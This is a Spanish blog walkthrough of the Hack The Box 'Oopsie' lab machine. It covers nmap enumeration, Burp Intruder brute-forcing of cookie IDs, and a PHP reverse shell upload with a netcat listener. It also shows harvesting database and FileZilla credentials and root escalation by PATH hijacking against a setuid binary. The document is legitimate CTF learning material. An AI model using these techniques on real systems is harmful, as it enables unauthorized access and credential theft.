@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="author" content="penserbjorne" />
+
+        <meta name="twitter:creator" content="@@_penserbjorne">
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="blog, penserbjorne, htb, pentest, hacking, oopsie, htb, blog, penserbjorne, htb, pentest, hacking, oopsie" />
+
+<meta property="og:title" content="Hack-The-Box (0003) &gt; Starting point &gt; Oopsie "/>
+<meta property="og:url" content="https://penserbjorne.com/drafts/hack-the-box-0003-starting-point-oopsie-es-MX.html" />
+<meta property="og:description" content="Anotaciones sobre la máquina “Oopsie” de la sección “Starting point” de Hack-The-Box" />
+<meta property="og:site_name" content="Blog de Penserbjorne" />
+<meta property="og:article:author" content="penserbjorne" />
+<meta property="og:article:published_time" content="2021-03-19T00:00:00-06:00" />
+<meta property="og:article:modified_time" content="2021-03-19T00:00:00-06:00" />
+<meta name="twitter:title" content="Hack-The-Box (0003) &gt; Starting point &gt; Oopsie ">
+<meta name="twitter:description" content="Anotaciones sobre la máquina “Oopsie” de la sección “Starting point” de Hack-The-Box">
+
+        <title>Hack-The-Box (0003) &gt; Starting point &gt; Oopsie  · Blog de Penserbjorne
+</title>
+        <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.min.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="https://penserbjorne.com/theme/css/elegant.prod.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="https://penserbjorne.com/theme/css/custom.css" media="screen">
+
+        <link href="https://penserbjorne.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Blog de Penserbjorne - Full Atom Feed" />
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="https://penserbjorne.com/"><span class=site-name>Blog de Penserbjorne</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       https://penserbjorne.com
+                                    >Home</a>
+                                </li>
+                                <li ><a href="https://penserbjorne.com/categories.html">Categories</a></li>
+                                <li ><a href="https://penserbjorne.com/tags.html">Tags</a></li>
+                                <li ><a href="https://penserbjorne.com/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="https://penserbjorne.com/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+                <div class="row-fluid">
+                    <div class="span1"></div>
+                    <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset2">
+        <h1>
+            <a href="https://penserbjorne.com/drafts/hack-the-box-0003-starting-point-oopsie-es-MX.html">
+                Hack-The-Box (0003) > Starting point > Oopsie
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset2 article-content">
+            
+            <h1>Oopsie</h1>
+<p>Bueno, esta es la segunda entrada de la serie de anotaciones sobre la sección
+<em>Starting point</em> de <code>HTB</code>. En esta ocasión trabajaremos con la máquina
+<em>Oopsie</em>. Si no sabes bien de que hablo te recomiendo que primero leas la
+<a href="{filename}./htb-01-starting-point-section.md">entrada que inaugura esta serie</a>.</p>
+<p><strong>Nota:</strong> Para fines didácticos (en realidad no quiero reescribir todo) este
+texto y el resto de la serie estarán basados en la entrada previa, en este caso
+en la entrada de <a href="https://penserbjorne.com/hack-the-box-0002-starting-point-archetype-es-MX.html">Archetype</a>.</p>
+<ul>
+<li><strong>Máquina:</strong>&nbsp;Oopsie</li>
+<li><strong><span class="caps">SO</span>:</strong>&nbsp;Linux</li>
+<li><strong><span class="caps">IP</span>:</strong>&nbsp;10.10.10.28</li>
+</ul>
+<h2>Enumeration</h2>
+<p>Como siempre digo: &#8220;<em>primero lo primero</em>&#8220;, pues vamos a comenzar a <strong>enumerar</strong>
+lo que tiene el equipo objetivo, en este caso vamos a tratar de identificar
+los puertos abiertos y el software asociado a&nbsp;estos.</p>
+<p>Para esto utilizaremos la siempre poderosa herramienta de
+<a href="https://es.wikipedia.org/wiki/Nmap">Nmap</a>.</p>
+<p>Lo primero que nos recomiendan utilizar es el siguiente&nbsp;comandos:</p>
+<div class="highlight"><pre><span></span><code>nmap -sS -A <span class="m">10</span>.10.10.28
+</code></pre></div>
+
+
+<p>Del comando anterior podemos observar los siguientes&nbsp;parámetros:</p>
+<ul>
+<li><code>-sS</code>: Estamos indicando un escaneo <code>TCP SYN (Stealth) Scan</code>, el cual es el
+más común ya que es relativamente discreto y sigiloso debido a que nunca
+completa las conexiones <span class="caps">TCP</span>. Requiere permisos de <code>root</code>.</li>
+<li><code>-A</code>: Permite indicar un escaneo agresivo, es un alias para
+<code>-O -sV -sC --traceroute</code>. En resumen habilita detección del <span class="caps">SO</span>, detección de
+versiones de software, escaneo de scripts, y traceroute de la&nbsp;conexión.</li>
+<li><code>10.10.10.28</code>: Indicamos la dirección del objetivo a&nbsp;escanear.</li>
+</ul>
+<p>La salida del comando anterior es la&nbsp;siguiente.</p>
+<div class="highlight"><pre><span></span><code>Starting Nmap <span class="m">7</span>.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2021</span>-03-19 <span class="m">17</span>:46 EDT
+Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.28
+Host is up <span class="o">(</span><span class="m">0</span>.069s latency<span class="o">)</span>.
+Not shown: <span class="m">998</span> closed ports
+PORT   STATE SERVICE VERSION
+<span class="m">22</span>/tcp open  ssh     OpenSSH <span class="m">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol <span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">2048</span> <span class="m">61</span>:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> <span class="m">24</span>:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> <span class="m">78</span>:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 <span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp open  http    Apache httpd <span class="m">2</span>.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Welcome
+No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span><span class="m">7</span>.91%E<span class="o">=</span><span class="m">4</span>%D<span class="o">=</span><span class="m">3</span>/19%OT<span class="o">=</span><span class="m">22</span>%CT<span class="o">=</span><span class="m">1</span>%CU<span class="o">=</span><span class="m">44601</span>%PV<span class="o">=</span>Y%DS<span class="o">=</span><span class="m">2</span>%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>60551BC
+OS:7%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span><span class="m">102</span>%GCD<span class="o">=</span><span class="m">1</span>%ISR<span class="o">=</span><span class="m">100</span>%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS
+OS:<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M54DST11NW7%O2<span class="o">=</span>M54DST11NW7%O3<span class="o">=</span>M54DNNT11NW7%O4<span class="o">=</span>M54DST11NW7%O5<span class="o">=</span>M54DST1
+OS:1NW7%O6<span class="o">=</span>M54DST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FE88%W2<span class="o">=</span>FE88%W3<span class="o">=</span>FE88%W4<span class="o">=</span>FE88%W5<span class="o">=</span>FE88%W6<span class="o">=</span>FE88<span class="o">)</span>ECN
+OS:<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span>FAF0%O<span class="o">=</span>M54DNNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>A
+OS:S%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T5<span class="o">(</span>R
+OS:<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>A%A<span class="o">=</span>Z%F
+OS:<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span><span class="m">40</span>%W<span class="o">=</span><span class="m">0</span>%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span><span class="m">0</span>%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%
+OS:T<span class="o">=</span><span class="m">40</span>%IPL<span class="o">=</span><span class="m">164</span>%UN<span class="o">=</span><span class="m">0</span>%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span><span class="m">40</span>%CD
+OS:<span class="o">=</span>S<span class="o">)</span>
+
+Network Distance: <span class="m">2</span> hops
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port <span class="m">199</span>/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+<span class="m">1</span>   <span class="m">70</span>.58 ms <span class="m">10</span>.10.14.1
+<span class="m">2</span>   <span class="m">70</span>.88 ms <span class="m">10</span>.10.10.28
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">24</span>.47 seconds
+</code></pre></div>
+
+
+<p>Cómo podemos observar se encuentran abiertos dos puertos con sus respectivos
+servicios, el puerto 22 para <code>SSH</code> y el puerto 80 para un servidor web <code>Apache</code>.</p>
+<p>Dado que hay un servidor web podemos ingresar por el navegador a la <span class="caps">IP</span>&nbsp;correspondiente.</p>
+<p>Ingresando podemos ver un sitio web de <code>MegaCorp Automotive</code>. Revisando el sitio
+podemos observar que hacen referencia a un <em>inicio de sesión</em>.</p>
+<ul>
+<li>Podemos revisar código fuente del sitio, veremos el script en el directorio&nbsp;folder</li>
+<li>
+<p>Burpsuite</p>
+<ul>
+<li>Configuramos firefox para que apunte a&nbsp;127.0.0.1:8080</li>
+<li>Refrescamos&nbsp;sitio</li>
+<li>Verificamos que &#8220;Intercept is off&#8221; en&nbsp;&#8220;Proxy&#8221;</li>
+<li>Encotramos el enlace de login de nuevo&nbsp;:v</li>
+</ul>
+</li>
+<li>
+<p>Ingresamos al&nbsp;login</p>
+<ul>
+<li>Intentamos credenciales &#8220;admin&#8221; y &#8220;MEGACORP_4dm1n!!&#8221; de la maquina&nbsp;anterior</li>
+<li>Ingresamos al&nbsp;portal</li>
+<li>Revisamos el portal y vemos que la sección &#8220;Uploads&#8221; esta&nbsp;bloqueada</li>
+</ul>
+</li>
+<li>
+<p>Buscamos acceso a&nbsp;&#8220;Upload&#8221;</p>
+<ul>
+<li>Vemos que en la sección &#8220;Accounts&#8221; que se despliegan datos de las&nbsp;credenciales</li>
+<li>Vamos a revisar las peticiones con&nbsp;Burpsuite</li>
+<li>Activamos la opción &#8220;Intercept is on&#8221; en&nbsp;&#8220;Proxy&#8221;</li>
+<li>Revisamos la cookie y vemos que hay un &#8220;user&#8221; id y un&nbsp;&#8220;role&#8221;</li>
+</ul>
+</li>
+<li>
+<p>Hacemos brute force a los valores del <span class="caps">ID</span> para encontrar otros&nbsp;roles</p>
+<ul>
+<li>En la sección Intruder<ul>
+<li>En la sección Positions<ul>
+<li>Limpiamos las variables y solo indicamos que será el&nbsp;1</li>
+</ul>
+</li>
+<li>En la sección payloads<ul>
+<li>Generamos el script para&nbsp;numeros</li>
+<li>Pegamos los numetos en las opciones del&nbsp;payload</li>
+</ul>
+</li>
+<li>Sección options<ul>
+<li>Sección redirections<ul>
+<li>Habilitamos &#8220;Follow redirections&#8221; to&nbsp;&#8220;Always&#8221;</li>
+<li>Habilitamos &#8220;Process cookies in&nbsp;redirections&#8221;</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Sección Target<ul>
+<li>Comenzamos&nbsp;ataque</li>
+<li>Vemos los resultados, observamos que hay un cambio en el tampo de las&nbsp;respuestas</li>
+<li>Analizamos los que sean de tamaño distinto hasta encontrar al super&nbsp;admin</li>
+<li>Vemos que la respuesta corresponde al request id=30 y el id user=86575 es el del super&nbsp;admin</li>
+<li>Con &#8220;Intercetp&#8221; activamos vamos a Uploads y ponemos el user del super&nbsp;admin</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2>Foothold</h2>
+<ul>
+<li>Probablemente no hay input&nbsp;validation</li>
+<li>
+<p>Subimos una reverse&nbsp;shell</p>
+<ul>
+<li>https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</li>
+<li><span class="dquo">&#8220;</span>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell&nbsp;Cheatsheet.md&#8221;</li>
+<li>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php<ul>
+<li>curl -O&nbsp;https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</li>
+</ul>
+</li>
+<li>Obtengo mi <span class="caps">IP</span> y modifico la shell con la <span class="caps">IP</span> y el puerto&nbsp;(tun)</li>
+<li>Subo la&nbsp;shell</li>
+</ul>
+</li>
+<li>
+<p>Utilizamos dirserch para escanear las&nbsp;carpetas</p>
+<ul>
+<li>https://github.com/maurosoria/dirsearch<ul>
+<li>git clone&nbsp;https://github.com/maurosoria/dirsearch.git</li>
+<li>cd&nbsp;dirsearch</li>
+<li>python3 dirsearch.py -u http://10.10.10.28 -e php<ul>
+<li>Indicamos el&nbsp;objetivo</li>
+<li>Indicamos las extensiones de archivo a dar&nbsp;prioridad</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Encontramos el folder&nbsp;uploads</li>
+<li>configuramos firewall<ul>
+<li>ufw allow from 10.10.10.27 proto tcp to any port&nbsp;80,443</li>
+</ul>
+</li>
+<li>Preparamos netcat<ul>
+<li>rlwrap nc -lvnp 443<ul>
+<li><code>l</code>: modo de escucha, para conexiones&nbsp;entrantes</li>
+<li><code>v</code>: modo <code>verbose</code>, para ir viendo que&nbsp;sucede</li>
+<li><code>n</code>: para trabajar con direcciones <span class="caps">IP</span></li>
+<li><code>p</code>:</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Activamos la shell<ul>
+<li>curl&nbsp;http://10.10.10.28/uploads/test.php</li>
+</ul>
+</li>
+<li>Obtenemos una shell interactiva<ul>
+<li><span class="caps">SHELL</span>=/bin/bash script -q&nbsp;/dev/null</li>
+<li>Ctrl-Z</li>
+<li>stty raw&nbsp;-echo</li>
+<li>fg</li>
+<li>reset</li>
+<li>xterm</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2>Lateral&nbsp;movement</h2>
+<ul>
+<li>Analizamos el sitio para ver si encontramos algo interante en los archivos
+php del login<ul>
+<li>cd&nbsp;/var/www/html/cdn-cgi/login</li>
+<li>notamos el archivo db.php, lo&nbsp;revisamos</li>
+<li>Encontramos accesos a mysql<ul>
+<li>$conn =&nbsp;mysqli_connect(&#8216;localhost&#8217;,&#8217;robert&#8217;,&#8217;M3g4C0rpUs3r!&#8217;,&#8217;garage&#8217;);</li>
+</ul>
+</li>
+<li>Cambiamos al usuario&nbsp;robert</li>
+<li>Sacamos la&nbsp;flag</li>
+</ul>
+</li>
+</ul>
+<h2>Privilege&nbsp;Escalation</h2>
+<ul>
+<li>
+<p>Buscamos que onda con&nbsp;robert</p>
+<ul>
+<li>id robert, para verificar sus&nbsp;grupos</li>
+<li>encontramos el grupo&nbsp;bugtracker</li>
+</ul>
+</li>
+<li>
+<p>Buscamos archivos relacionados al grupo&nbsp;bugtracker</p>
+<ul>
+<li>https://askubuntu.com/questions/350208/what-does-2-dev-null-mean</li>
+<li>Encontramos un&nbsp;binario</li>
+<li>listamos el binario para ver sus&nbsp;permisos</li>
+<li>Vemos que tiene el setuid asignado (por la s)<ul>
+<li>Permite ejecutar el binaro como si fuera root para cualquier&nbsp;usuario</li>
+</ul>
+</li>
+<li>Ejecutamos el binario para ver que&nbsp;hace</li>
+<li>Analizamos sus cadenas internas con strings<ul>
+<li>Vemos que manda a llamar a <code>cat</code></li>
+<li>Podemos crear un <code>cat</code> malvado que sea suplantado
+    <code>export PATH=/tmp:$PATH
+    cd /tmp/
+    echo '/bin/sh' &gt; cat
+    chmod +x cat</code></li>
+</ul>
+</li>
+<li>Ejecutamos bugtracker para obtener una nueva shell con permisos de&nbsp;root</li>
+<li>vamos al directorio root y extraemos la&nbsp;flag</li>
+</ul>
+</li>
+<li>
+<p>Continuamos revisando por chismoso, folder .config, veremos un archivo de filezilla con&nbsp;credenciales</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;User&gt;</span>ftpuser<span class="nt">&lt;/User&gt;</span>
+<span class="nt">&lt;Pass&gt;</span>mc@F1l3ZilL4<span class="nt">&lt;/Pass&gt;</span>
+</code></pre></div>
+
+
+<h2>Fin</h2>
+<p>Bueno, con eso hemos concluido la revisión del primer walk-through de las
+máquinas de introducción de <code>HTB</code>. Este texto fue un poco más extenso ya que se
+fueron expllicando paso a paso cada comando, pero conforme avancemos en las
+herramientas y comandos obviaremos los que se hayan explicado&nbsp;previamente.</p>
+<p>Espero haya sido de tu agrado y utilidad este texto, y si vas comenzando en
+estos temas de seguridad, <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">recuerda no rendirte</a>
+y seguir aprendiendo poco a&nbsp;poco.</p>
+<p>Nos vemos en el siguiente texto.&nbsp;Ciao!</p>
+<p><code>#HappyHacking</code></p>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2021-03-19T00:00:00-06:00">mar 19, 2021</time>
+
+            <h4>Category</h4>
+            <a class="category-link" href="https://penserbjorne.com/categories.html#htb-ref">htb</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="https://penserbjorne.com/tags.html#blog-ref">blog
+                    <span>8</span>
+</a></li>
+                <li><a href="https://penserbjorne.com/tags.html#hacking-ref">hacking
+                    <span>2</span>
+</a></li>
+                <li><a href="https://penserbjorne.com/tags.html#htb-ref">htb
+                    <span>2</span>
+</a></li>
+                <li><a href="https://penserbjorne.com/tags.html#oopsie-ref">oopsie
+</a></li>
+                <li><a href="https://penserbjorne.com/tags.html#penserbjorne-ref">penserbjorne
+                    <span>3</span>
+</a></li>
+                <li><a href="https://penserbjorne.com/tags.html#pentest-ref">pentest
+                    <span>2</span>
+</a></li>
+            </ul>
+<h4>Contact</h4>
+<div id="sidebar-social-link">
+    <a href="https://twitter.com/_penserbjorne" title="" target="_blank" rel="nofollow noopener noreferrer">
+        <svg xmlns="http://www.w3.org/2000/svg" aria-label="Twitter" role="img" viewBox="0 0 512 512"><rect width="512" height="512" rx="15%" fill="#1da1f3"/><path fill="#fff" d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+    </a>
+    <a href="https://github.com/penserbjorne/" title="" target="_blank" rel="nofollow noopener noreferrer">
+        <svg xmlns="http://www.w3.org/2000/svg" aria-label="GitHub" role="img" viewBox="0 0 512 512"><rect width="512" height="512" rx="15%" fill="#1B1817"/><path fill="#fff" d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+    </a>
+</div>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+                    </div>
+                    <div class="span1"></div>
+                </div>
+            </div>
+        </div>
+<footer>
+
+    <div>
+        <span class="site-name">Blog de Penserbjorne</span> - Otro sitio cliché de tecnología (que no sabe utilizar acentos) >;v
+    </div>
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
